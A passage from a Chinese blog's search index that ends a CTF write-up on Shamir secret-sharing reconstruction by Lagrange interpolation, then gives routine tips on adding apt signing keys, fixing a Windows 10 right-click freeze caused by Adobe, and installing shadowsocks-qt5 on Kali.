vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">5</span><span class="mpunct">,</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">7</span><span class="mpunct">,</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">9</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2258</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2424</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2630</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>将这些值代入插值公式中，得到原始秘密数据：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mn>2258</mn><mo>⋅</mo><mfrac><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>7</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>9</mn><mo stretchy="false">)</mo></mrow><mrow><mo stretchy="false">(</mo><mn>5</mn><mo>−</mo><mn>7</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>5</mn><mo>−</mo><mn>9</mn><mo stretchy="false">)</mo></mrow></mfrac><mo>+</mo><mn>2424</mn><mo>⋅</mo><mfrac><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>9</mn><mo stretchy="false">)</mo></mrow><mrow><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>9</mn><mo stretchy="false">)</mo></mrow></mfrac><mo>+</mo><mn>2630</mn><mo>⋅</mo><mfrac><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><mrow><mo stretchy="false">(</mo><mn>9</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>9</mn><mo>−</mo><mn>7</mn><mo stretchy="false">)</mo></mrow></mfrac><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>5987</mn></mrow><annotation encoding="application/x-tex">f(0) = 2258 \cdot \frac{(0-7)(0-9)}{(5-7)(5-9)} + 2424 \cdot \frac{(0-5)(0-9)}{(7-5)(7-9)} + 2630 \cdot \frac{(0-5)(0-7)}{(9-5)(9-7)} \mod 5987</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2258</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">9</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">9</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2424</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">9</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">9</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2630</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5987</span></span></span></span></span></p><p>计算这个表达式，即可得到重构出来的重要秘密数据。请注意，在模运算中，需要确保计算的结果始终保持在模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的范围内。</p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF-WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>deepin-ubuntu-kali没有签名无法签证仓库源</title>
    <link href="/posts/f1373c55.html"/>
    <url>/posts/f1373c55.html</url>
    
    <content type="html"><![CDATA[<p>deepin/ubuntu/kali更换仓库源提示没有签名</p><p><img src="https://ae01.alicdn.com/kf/HTB1dUKaav1H3KVjSZFH762KppXaT.png" alt=""></p><p>通过以下命令添加公钥即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys xxxxxxxxx <span class="hljs-comment">#公钥后八位</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1Z1KiaBGw3KVjSZFD760WEpXa5.png" alt=""></p><p>再重新执行 apt-get update 获取软件更新列表</p><p><img src="https://ae01.alicdn.com/kf/HTB1KV9baxiH3KVjSZPf760BiVXai.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘录</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows 10 右键卡死</title>
    <link href="/posts/19398ee8.html"/>
    <url>/posts/19398ee8.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><blockquote><p>今天自己的电脑不知道怎么回事，右键打开所有的文件都打开不了，电脑直接卡死并且弹出【此应用无法在你的电脑上运行】，What？？</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1mD9oaBKw3KVjSZFOq6yrDVXaY.jpg" alt="S"></p><blockquote><p>我打开个txt都打不开了？直接双击打开又可以正常打开，而右键却不行。起初我还以为电脑中病毒了，于是度娘一波，然而找到的都是些某某软件打不开之类的，说什么修改软件属性，以兼容模式运行啥的。但是我的不是应用打不开啊，而是所有文档类的右键打不开，右键就直接卡死。难道还要我重装系统不成？重装，那是不存在的！捣搞了好半天才发现原来是【Adobe】惹的祸</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1O_9oaBKw3KVjSZFO761rDVXaV.png" alt=""></p><blockquote><p>Adobe会在右键菜单生产快捷方式，而且Adobe有个插件老是开机自启，禁都禁不掉，但是在几天前我就把那插件改了个名字，用个txt文件替换了它。鼠标右键文件时，电脑找不到Adobe的索引加载不出来，所以电脑会卡死并且会弹出【此应用无法在你的电脑上运行】的提示。于是乎才有了此文。</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1KM5kaBWD3KVjSZFs763qkpXaj.png" alt=""></p><h3 id="解决方法">解决方法</h3><p>ps：Adobe的插件我是不想让它重新启用的，所以继续使用txt文本替换那个插件【改成exe尾缀】</p><p>打开安全软件，360、电脑管家之类的【我用的是火绒】，然后找到右键管理，把Adobe的选项给去掉即可。</p><p><img src="https://ae01.alicdn.com/kf/HTB10NCkaBWD3KVjSZKP761p7FXaS.png" alt=""></p><p>去掉Adobe选项</p><p><img src="https://ae01.alicdn.com/kf/HTB1t91raq1s3KVjSZFA760_ZXXaW.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘录</tag>
      
      <tag>win10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali安装shadowsocks-qt5</title>
    <link href="/posts/3dd71f61.html"/>
    <url>/posts/3dd71f61.html</url>
    
    <content type="html"><![CDATA[<h3 id="先安装依赖包">先安装依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install qt5-qmake qtbase5-dev libqrencode-dev libappindicator-dev libzbar-dev<br></code></pre></td></tr></table></figure><p>如出现错误，在后面加入 <code>--fix-missing</code> 来修正错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install qt5-qmake qtbase5-dev libqrencode-dev libappindicator-dev libzbar-dev --fix-missing<br></code></pre></td></tr></table></figure><h3 id="下载deb包">下载deb包</h3><p>到GitHub下载五个deb包<a href="https://github.com/try1try/shadowsocks-qt5">github</a></p><p><img src="https://ae01.alicdn.com/kf/HTB1mTGaaBaE3KVjSZLe760sSFXaS.png" alt=""></p><p>下载完后解压并在终端cd到deb包存放的目录下</p><p><img src="https://ae01.alicdn.com/kf/HTB1M_8.awaH3KVjSZFj763FWpXaX.png" alt=""></p><p>然后安装 gdebi（这里我已经安装过了）</p><p><img src="https://ae01.alicdn.com/kf/HTB1TOCbaCWD3KVjSZSg763CxVXan.png" alt=""></p><p>然后分别执行 gdebi 刚才下载的5个deb包(以<code>root</code>权限执行)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdebi libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb<br>gdebi libbotan-1.10-0_1.10.8-2+deb8u1_amd64.deb<br>gdebi libqtshadowsocks_1.10.0-1_amd64.deb<br>gdebi libqtshadowsocks-dev_1.10.0-1_amd64.deb<br>gdebi shadowsocks-qt5_2.8.0-1_amd64.deb<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1UTKaaBaE3KVjSZLe760sSFXaB.png" alt=""></p><h3 id="在应用找到小飞机并启动它">在应用找到小飞机并启动它</h3><p><img src="https://ae01.alicdn.com/kf/HTB1fmGXaECF3KVjSZJn762nHFXap.png" alt=""></p><p>配置小飞机相关参数即可</p><p><img src="https://ae01.alicdn.com/kf/HTB15_afaBCw3KVjSZFl763JkFXa0.png" alt=""></p><p>update：2018-10-22</p><h3 id="通过添加deepin源来安装">通过添加deepin源来安装</h3><p>编辑/etc/apt/sources.list文件(需要使用sudo), 在文件最前面添加以下条目(操作前请做好相应备份)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">deb [by-hash=force] http://mirrors.aliyun.com/deepin panda main contrib non-free<br></code></pre></td></tr></table></figure><p>然后 apt-get update 更新下列表</p><p>再执行以下命令进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install shadowsocks-qt5<br></code></pre></td></tr></table></figure><p>update：2019-05-27</p><h3 id="使用github上纸飞机项目给出的可执行程序">使用github上纸飞机项目给出的可执行程序</h3><p>download：<code>https://github.com/shadowsocks/shadowsocks-qt5/releases</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> +x Shadowsocks-Qt5-3.0.1-x86_64.AppImage<br>./Shadowsocks-Qt5-3.0.1-x86_64.AppImage<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1Vs9aaBWD3KVjSZKP761p7FXa0.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘录</tag>
      
      <tag>kali</tag>
      
      <tag>shadowsocks-qt5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
